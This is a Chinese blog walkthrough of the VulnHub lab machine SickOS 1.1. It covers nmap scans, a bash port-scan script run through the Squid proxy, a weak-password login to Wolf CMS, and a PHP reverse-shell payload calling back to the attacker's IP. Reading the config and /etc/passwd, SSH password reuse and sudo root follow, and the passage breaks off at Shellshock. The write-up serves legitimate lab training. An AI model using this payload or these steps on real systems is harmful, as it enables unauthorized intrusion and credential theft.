---
title: 跟着红队笔记打靶：sickos
url: https://mp.weixin.qq.com/s/5DYayr6mgYeS7_dwXuI2nw
source: Doonsec's feed
date: 2026-03-07
fetch_date: 2026-03-08T04:03:57.506650
---

# 跟着红队笔记打靶：sickos

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hAugh98lMaQQIIOrRedrclLN11MhuHpdv683pV9IX3nyf9qvQz5kKRWqPbhicibXqXaxIhNAUNsYaD6KaqsEbZEOibm5wRbvYRWCM3jRmNXuW0/0?wx_fmt=jpeg)

# 跟着红队笔记打靶：sickos

原创

网安热爱者week
网安热爱者week

week的杂货铺

![]()

在小说阅读器中沉浸阅读

靶场地址：https://www.vulnhub.com/entry/sickos-11,132/

大佬的视频：

【「红队笔记」靶机精讲：SickOS1.1 - 穿越Squid代理的CMS渗透】https://www.bilibili.com/video/BV1Em4y1A7XX?vd\_source=3caf2dac9c9273de4d9b0fead4712250

【「红队笔记」靶机精讲：SickOS1.1 - Shellshock原理和利用过程精讲】https://www.bilibili.com/video/BV14e4y1n7ua?vd\_source=3caf2dac9c9273de4d9b0fead4712250

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaSASKvNQfBXkIp8ZgZ1d3j9oOu183Jz1bQAQbvp4EdnetQUqmu5T4mgOOP8AYiaNILWxuX2c5dCD4bn3oMUB4XQJ8TRBYtAc5Uo/640?wx_fmt=png&from=appmsg)

# 1. 信息搜集：

## 1.1. 主机发现：

```
sudo nmap -sn 192.168.137.0/24
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaR0lNHiaZRQzz8F5nPuKngCdWB2dnYeWlTojqXWWvo1hg0k7DiaHkCFB0ZfhVKCZW5Kp1IbkaoYAPnOjkfW7SZMibOaheW0FdeT5k/640?wx_fmt=png&from=appmsg)

141是靶机

## 1.2. 端口扫描：

```
sudo nmap -sT --min-rate 1000 -p- 192.168.137.141 -oA ./nmapscan/ports
```

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaTy0Pia0468CXZIon8RKUaDiaOJpxej4gbJ0sic2OKGs29QkibFjB0kUMzdvPfgzVacESaMVR54DsY9JuDHYGaibzUibSNtj037lyq4U/640?wx_fmt=png&from=appmsg)

## 1.3. 详细扫描:

tcp:

```
sudo nmap -sC -sT -sV -O -p$ports 192.168.137.141 -oA ./nmapscan/tcp_detail
```

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaQwNY80LNUGziapNtVQ2RsZu838lqP4MTYEqsuth19WV2rdgicZ0GVmiacsGeaXBcgP2LNCJUWJAtEwWj2GIGBq6Tjlkfw6AnbaGE/640?wx_fmt=png&from=appmsg)

udp:

```
sudo nmap -sU --top-ports 20 192.168.137.141 -oA ./nmapscan/udp_detail
```

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaT1yFjvHaPKBrQVy8HYulZOwl1n7W8It6gE5q5OHMS8xmFXtjeib8VDdaRjT6gOypKRJxpwbHV5naxfP0n6yDnXicEc1zcUomnBM/640?wx_fmt=png&from=appmsg)

脚本扫描：

```
sudo nmap --script=vuln -p22,3128,8080 192.168.137.141 -oA ./nmapscan/vuln
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaQzgPKA2qOibTX3hwYj5wyGicw6KSePuZzQ78txkbib4Y0ASRMhtSqgB9jIAssARdlu708Y1SldK0pJSCgEXSNhicYWRpV1RS005QU/640?wx_fmt=png&from=appmsg)

# 2. 渗透测试：

3128端口：

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaSj2AkwrKDydpT01XVwvAc4myQ1sWT8SdneIFfwImhfONib7euSbnwcJzAfckvibVM0yXMfSB9h3Jia9q7riaMJsZsq5ULtPaGaBMc/640?wx_fmt=png&from=appmsg)

目录扫描：

没东西

但是这是squid 一个用来架设代理的东西

他的默认http/https代理端口是3128
也就是现在访问的这个端口。

这里尝试使用proxychains进行代理连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaQC4UklvCtt2EiarOGzzN22GLnkedIKYvV5faIl9eZYV8jaXlyibyIbNnpeliclA6hGLDuxf2rwlNS57jibSUp55Zic3TH9ibSlzuDv0/640?wx_fmt=png&from=appmsg)

然后失败了

查了一下，发现原因是：

proxychains 为了让其他程序通过代理工作，会强制使用 HTTP CONNECT 方法

告诉对方的代理程序建立一个到目标的TCP隧道 剩下的数据proxychains自己进行传送。

而Squid 默认配置中有一条规则通常是：http\_access deny CONNECT !Safe\_ports

也就是拒绝所有 CONNECT 请求，除非目标端口在 Safe\_ports 列表中。

squid用这种方式来防止循环代理或内部攻击，而一般情况下80端口并不在safe\_ports中。

查一下历史漏洞：

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaTwtfEKgv3pRxy7ibjCnFccPG6icd8z6nvJaSNbnsWydGlHLWJznLx8cWoyoiafP5ibgIeZlibnNo0ZFU0IQ8tVSdHBG76NG0lG7Kpg/640?wx_fmt=png&from=appmsg)

这个漏洞是：

http加速模式下，为了性能，Squid 假设所有发往它的请求都是合法的，并且目标就是那个配置好的后端主机，跳过或者只进行了简单的端口检查。

使得当攻击者发送GET到http://192.168.137.141:22时，squid直接向22端口进行TCP连接，并尝试发一个get请求

此时：

* 如果 22 端口**关闭**：TCP 连接失败，Squid

  返回`503 Service Unavailable`或`404`(取决于版本)。
* 如果 22 端口**开放** (即使是 SSH)：TCP 连接成功。

  SSH 守护进程会接收 `GET /` 并返回 SSH 的 Banner 或错误信息。Squid 把这个响应原封不动地传回给攻击者，并附带 `HTTP 200 OK` 状态码（因为 TCP 连接建立了）。

也就是squid只进行了一个TCP的GET请求中继 没有进行协议的转换。

根据这个写了一个在proxy条件下实现的端口扫描脚本

```
#!/bin/bashSQUID_IP="192.168.137.141" # Squid 服务器 IPSQUID_PORT="3128"          # Squid 端口TARGET_IP="192.168.137.141" # 实际要扫描的目标 (在加速模式下，Squid 可能强制转发到配置的后端，这里填什么有时不重要，但最好填目标)# 常见端口列表PORTS=(21 22 23 25 53 80 110 143 443 3306 3389 8080)echo "Starting Squid Accelerator Scan via $SQUID_IP..."for port in "${PORTS[@]}"; do    # 发送请求，捕获 HTTP 状态码和响应头/体    # -s: 静默模式, -o /dev/null: 丢弃输出(稍后我们改一下以查看 banner), -w: 自定义输出格式    # 注意：这里我们故意请求 http://TARGET_IP:PORT/    RESPONSE=$(curl -s -o - -w "\n%{http_code}" --proxy "http://$SQUID_IP:$SQUID_PORT" "http://$TARGET_IP:$port/" 2>/dev/null)    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)    BODY=$(echo "$RESPONSE" | sed '$d') # 去掉最后一行状态码，剩下的就是 body         if [[ "$HTTP_CODE" == "200" ]] || [[ "$HTTP_CODE" == "301" ]] || [[ "$HTTP_CODE" == "302" ]]; then        echo "[+] Port $port is OPEN (HTTP Code: $HTTP_CODE)"        # 打印前 100 个字符看看是不是服务 Banner        echo "    Banner Preview: ${BODY:0:100}..."    elif [[ "$HTTP_CODE" == "503" ]] || [[ "$HTTP_CODE" == "404" ]] || [[ "$HTTP_CODE" == "000" ]]; then        # 000 通常意味着连接被拒绝或超时        echo "[-] Port $port is CLOSED or FILTERED (HTTP Code: $HTTP_CODE)"    else        echo "[?] Port $port status unclear (HTTP Code: $HTTP_CODE)"    fidone
```

运行的结果是这个：

也就是说在代理条件下可以访问80端口 那就很好了~~

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaSHZqq67ZuB0bR7TpURI7ls5kZEPnqaap0nGLLCOr6ribfgRteTNAOCHibjJNibmmqjw906MuBxbR056sX85A5pAwh669KPryKR4w/640?wx_fmt=png&from=appmsg)

在proxy下，扫一下80目录

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaQRQoGqzPQViad2cXLwU0IIL2IDj04nonppZSiavo4zI4fK828UuxEpfIdDKbpDI3zmeKCGLBFxr4VOSHk0fb6ExVU4TDLdDxnJQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaTOiaf6qEePw8MRhNPU26e6kJ2icknvJIhFha0Om3soCemycKO1jpZIVvfWPUicORt7QaEuQoh7QlHOsVzECyficGREPzSo7T8g8y4/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaQ0iaxibNFbtK77qKM6cMq3HJkOoDvFA3nllurLiaqfictvOpy9h2UrjDdv7juJxuNCrKfgaBc5IedvHaDzPRwrl43x3Tbicax1PHD4/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaRGHicibN8CxWjcLMk9LrG1nKsI8wKsS8bIu9Zyq8eBwia5BAibjmysowwiczlVAxI1mFSxXA090RJpQcgpKBbx7R6KSZgylXvgukuQ/640?wx_fmt=png&from=appmsg)

看一下这个wolfcms:

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaQjUFgWeMsW9SRibbljUJaumejicRkAWbFgZ8SQfJ18PheFybhYicxj9EMFVdRjTdr7NXAUaNBySPxYicibYbibBoYh4X4W36FBq9FBw/640?wx_fmt=png&from=appmsg)

后台页面：

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaQ6evAGtE7wjb093pHuNd4H1JSe85fSj8tXKopwuGZSLUUfupicXYQc6CrN18DnI7hecWCDEJ9CYJ2ocz4nmod3lds0bI31w91w/640?wx_fmt=png&from=appmsg)

弱密码：admin admin

进入后台：

又可以创建文件 又可以改权限 真好~
![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaSkPmrkjAOxkJVpJWrV0qxPeZicRh798cZPUgbtbe90fqk34rAxj77IveRwcXGziaYGYqGuNmltRRA0HKYXg7DvFu3zDxKasVqico/640?wx_fmt=png&from=appmsg)

跑一个echo发现确实执行了。

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaQcC80iaV0A8YtsJTlThnZeBnt8Z573MGsOwrLuMYicJlU7WsMYYWE1fT3x8NfSXS3Ns8tsTGKgTKmkTRjcpkg5r84mIAOMMXApA/640?wx_fmt=png&from=appmsg)

直接使用反弹shell有时候会被立刻断开
这里用了下面这个 成功了。

```
<?php ignore_user_abort(true);set_time_limit(0);echo "hhh"; $cmd = "nohup bash -c 'bash -i >& /dev/tcp/192.168.137.128/443 0>&1' > /dev/null 2>&1 &";exec($cmd);sleep(5); ?>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaSKT4bymBQiccUicw38o9sarN7ian11DfIViaj9icGMjeAyFhAoITwT2MJqeJEIcibttL4OSs6uzZE9DicCiahyxFdZaIWlc1NnDhfZ2nk/640?wx_fmt=png&from=appmsg)

发现config文件：

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaSY6ibC01f9HRHPRiaicibVnXdPOa73icMr8rd0ngMHaTHbiacclRNgfuU5L89b8OXJU6v6xPJG3F9ibqkNpwk2CKft24zBuPhlwkoiaQ0/640?wx_fmt=png&from=appmsg)

/etc/passwd

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaSQuJ3wSwauXAmUmtGBsjib7QDhQQleISzU0zGfIRlU7hOwNfjbwRG7p49EIxrVhupicW1vgftaZx8gibib1f8rgl4sFzW3MWQy0yU/640?wx_fmt=png&from=appmsg)

尝试使用config里面的密码进行ssh登入

发现sickos可以实现登入 密码是config里面的john@123

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaQoaSqjINKt569fearfM2vxTVCR4TsGkribhCIzsodJwp3hxmfVSYsXvqnp31jaBbkhoRPHltEV5LcGD9NE0F4yul3G5PUialVXU/640?wx_fmt=png&from=appmsg)

sudo -l是全部权限 那就root了~~

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaQbrNtPMP2ialYodbsgfTFALHjWurmMRJRGEkgCaenx1hicfWxg3qxiacPWGESiav62kGIWVAj6bqOib9v14Og56ZiaJGE6rDgQesGA8/640?wx_fmt=png&from=appmsg)

这边大佬给了另一个解法：

```
sudo nikto -h 192.168.137.141 -useproxy http://192.168.137.141:3128
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaQgfRxNpLgyquLULDibe0tZxAPvL7CrUAheRElarV5NxIELmUtMxzAqT55Up8Cpt41Cnc4yvw3hvKsyJZTJSoN1icHJEmbnyOsgw/640?wx_fmt=png&from=appmsg)

发现一个shellshock

一般来说使用的攻击方式是：

Web 服务器 (Apache/Nginx) 配置了 C...